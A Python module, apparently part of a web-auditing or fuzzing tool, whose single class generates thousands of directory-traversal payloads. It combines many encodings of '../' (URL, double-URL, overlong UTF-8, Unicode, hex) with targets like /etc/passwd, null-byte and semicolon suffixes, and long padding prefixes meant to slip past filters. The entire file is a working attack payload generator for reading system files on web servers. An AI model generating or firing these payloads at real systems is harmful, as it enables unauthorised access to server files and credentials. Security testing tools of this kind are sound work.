import sys

from pipe import JSONPipe

class factory(JSONPipe):
    '''Generate payload for injection to webpages under audit
    '''

    def __init__(self):
        pass

    def process(self, incomings):
        '''Just generate all possible payloads and return them in a list.
        Ignore the `incomings` parameter because there are no inputs.

        return : a list of payloads
        '''

        payloads = []

        #Contains the various types of directory pathing
        #%2f = / || %2e = . || %252f = / || '%255c' = \
        list_of_postfix = ['/etc/\n', '/etc/passwd\n', '/etc/passwd%00index.html\n', '/etc/passwd;index.html\n','//etc//passwd\n']
        list_of_prefix = ['../', '..%2f', '%2e%2e/','%2e%2e%2f','..%252f/','%252e%252e/','%252e%252e%252f','..\\'
        ,'..%255c','%252e%252e\\','..%5c','%2e%2e\\', '%2e%2e%5c', '%252e%252e\\', '%252e%252e%255c','..%c0%af',
        '%c0%ae%c0%ae/','%c0%ae%c0%ae%c0%af','..%25c0%25af','%25c0%25ae%25c0%25ae/','%25c0%25ae%25c0%25ae%25c0%25af'
        ,'..%c1%9c','%c0%ae%c0%ae\\','%c0%ae%c0%ae%c1%9c','..%25c1%259c','%25c0%25ae%25c0%25ae\\','%25c0%25ae%25c0%25ae%25c1%259c'
        ,'..%%32%66','%%32%65%%32%65/','%%32%65%%32%65%%32%66','..%%35%63','%%32%65%%32%65/','%%32%65%%32%65%%35%63',
        '/..\\','.../','...\\','..../','....\\','..%u2215','%uff0e%uff0e/','%uff0e%uff0e%u2215','..%u2216','..%uEFC8','..%uF025'
        ,'%uff0e%uff0e\\','%uff0e%uff0e%u2216','..0x2f','0x2e0x2e/','0x2e0x2e0x2f','..0x5c','0x2e0x2e\\','0x2e0x2e0x5c','..%c0%2f'
        ,'%c0%2e%c0%2e/','%c0%2e%c0%2e%c0%2f','..%c0%5c','%c0%2e%c0%2e\\','%c0%2e%c0%2e%c0%5c','///%2e%2e%2f','\\\\\\%2e%2e%5c'
        ,'..//','..\\\\','..\\\\\\','./\\/./','.\\/\\.\\','./../','.\\..\\','.//..//','.\\\\..\\\\']


        for post_style in list_of_postfix:
            for pre_style in list_of_prefix:
                curr_file_path = post_style
                for times in range(0,10):
                    curr_file_path = pre_style + curr_file_path
                    payloads.append(curr_file_path)

        #Long Prefix
        list_of_long_prefix = ['AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/'
        , 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
        '..........................................................................',
        '././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././',
        '.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\']

        for long_prefix in list_of_long_prefix:
            for post_style in list_of_postfix:
                for pre_style in list_of_prefix:
                    curr_file_path = long_prefix
                    for times in range(0,10):
                        curr_file_path = curr_file_path+pre_style+post_style
                        payloads.append(curr_file_path)

        return payloads